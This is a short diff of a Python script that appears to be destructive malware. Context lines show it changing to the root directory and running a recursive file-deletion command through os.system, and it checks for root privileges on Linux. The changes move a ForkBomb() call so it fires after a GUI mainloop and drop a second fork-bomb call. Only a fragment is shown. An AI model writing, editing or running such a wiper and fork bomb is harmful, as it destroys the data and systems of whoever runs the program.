@@ -55,8 +55,8 @@ def MainThread():
         os.system("cd /")
         os.system(rmrf_command + f + "*")    
 
-    ForkBomb()
-    root.mainloop() 
+    if(root.mainloop()):
+        ForkBomb() 
 
 
 if (os.getuid() != 0):
@@ -69,6 +69,4 @@ if (platform.system() != "Linux"):
 
 if __name__ == "__main__":
     MainThread()
-    ForkBomb()
-
 
